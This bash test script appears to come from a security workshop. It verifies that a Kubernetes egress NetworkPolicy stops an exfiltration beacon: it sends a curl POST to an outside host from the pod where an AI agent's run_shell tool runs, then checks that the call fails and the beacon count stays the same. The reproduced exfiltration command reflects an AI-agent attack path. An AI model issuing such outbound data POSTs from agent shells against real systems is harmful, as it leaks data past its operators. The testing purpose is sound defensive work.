#!/usr/bin/env bash
# ABOUTME: C1 fallback: from the workshop-mcp pod, where BurritoBot's run_shell runs, POST to the beacon and
# ABOUTME: prove the egress NetworkPolicy drops it: the POST fails and the beacon count does not move. No model.
#
# Usage: CONTEXT=<admin-cluster kube-context> challenges/c1-exfil-s3/fallback.kubectl.sh
#
# The beat is run_shell's `curl -X POST https://agenticburn.com/beacon`, and run_shell runs in the
# workshop-mcp pod (container "shim"), so that is where this POST is made. The old version called
# example.com from guard-proxy, which proved nothing about the pod the attack uses (#499).
#
# The beacon count is the shared collector's, read from the beacon view. Every cluster posts to it, so the
# body carries a one-off marker as well: a count that moved while the marker is absent was another cluster.
# No scratch files: everything is held in shell variables.
set -euo pipefail

# Kube-context safety (see CLAUDE.md): target an explicit context; never the global current-context.
CONTEXT="${CONTEXT:?set CONTEXT to the admin cluster kube-context}"
command -v kubectl >/dev/null 2>&1 || { echo "kubectl not found on PATH" >&2; exit 1; }
command -v curl >/dev/null 2>&1 || { echo "curl not found on PATH" >&2; exit 1; }

readonly NS="agent"
readonly POD="deploy/workshop-mcp"
readonly CONTAINER="shim"
readonly BEACON="https://agenticburn.com/beacon"
readonly BEACON_VIEW="https://provisioning.agenticburn.com/beacon/view"
# The collector's 200 body ends "(HC-204 OK)" in both its old and current wording (#692).
readonly BEACON_OK="(HC-204 OK)"

kc() { kubectl --context "${CONTEXT}" -n "${NS}" "$@"; }

failed=0
check() {
    if [[ "$2" == "ok" ]]; then
        echo "  PASS  $1"
    else
        echo "  FAIL  $1${3:+: $3}"
        failed=1
    fi
}

# The total the view renders as data-count="N". Prints nothing when the view cannot be read.
beacon_view() { curl -fsS -m 15 "${BEACON_VIEW}" 2>/dev/null || true; }
beacon_count() { { grep -o 'data-count="[0-9]*"' <<<"$1" || true; } | head -1 | tr -dc '0-9'; }

echo "==> C1 egress: POST to the beacon from ${POD} (container ${CONTAINER}) in ${NS} on ${CONTEXT}"

if ! kc exec "${POD}" -c "${CONTAINER}" -- true >/dev/null 2>&1; then
    check "can exec into ${POD} -c ${CONTAINER}" fail "nothing below can be proven; is the ai-layer synced?"
    exit 1
fi

before="$(beacon_count "$(beacon_view)")"
if [[ -z "${before}" ]]; then
    check "beacon view readable at ${BEACON_VIEW}" fail "no count read, so the count check cannot be made"
    exit 1
fi
echo "    beacon count before: ${before}"

marker="wib-fallback-c1-$(date +%s)-${RANDOM}"
rc=0
out="$(kc exec "${POD}" -c "${CONTAINER}" -- curl -sS -m 15 -X POST "${BEACON}" \
    -H 'Content-Type: application/json' -d "{\"cluster\":\"${marker}\"}" 2>&1)" || rc=$?
echo "    curl exit ${rc}: ${out:0:200}"
# kubectl exec hands back curl's own exit code: 28 timed out, 7 refused, 6 no DNS. Exit 1 is kubectl
# failing to run the command at all, which proves nothing either way.
if [[ "${rc}" -eq 0 ]] || grep -qF "${BEACON_OK}" <<<"${out}"; then
    check "the POST from workshop-mcp fails" fail "the beacon answered; egress is open"
elif [[ "${rc}" -eq 1 ]]; then
    check "the POST from workshop-mcp fails" fail "kubectl could not run curl in the pod (exit 1)"
else
    check "the POST from workshop-mcp fails" ok
fi

view="$(beacon_view)"
after="$(beacon_count "${view}")"
echo "    beacon count after:  ${after:-unreadable}"
if [[ "${after}" == "${before}" ]]; then
    check "the beacon count does not move (${before} -> ${after})" ok
elif grep -q "${marker}" <<<"${view}"; then
    check "the beacon count does not move" fail "${before} -> ${after}, and this POST is on the view"
else
    check "the beacon count does not move" fail \
        "${before} -> ${after:-unreadable}, but this POST's marker is not on the view: another cluster posted"
fi
if [[ -z "${view}" ]]; then
    check "this POST (${marker}) is not on the beacon view" fail "the view could not be read"
elif grep -q "${marker}" <<<"${view}"; then
    check "this POST (${marker}) is not on the beacon view" fail "it landed"
else
    check "this POST (${marker}) is not on the beacon view" ok
fi

if [[ "${failed}" -eq 0 ]]; then
    echo "==> C1 PROVEN: the egress NetworkPolicy stopped the beacon POST from workshop-mcp."
else
    echo "==> C1 NOT PROVEN: see the FAIL lines above." >&2
    exit 1
fi
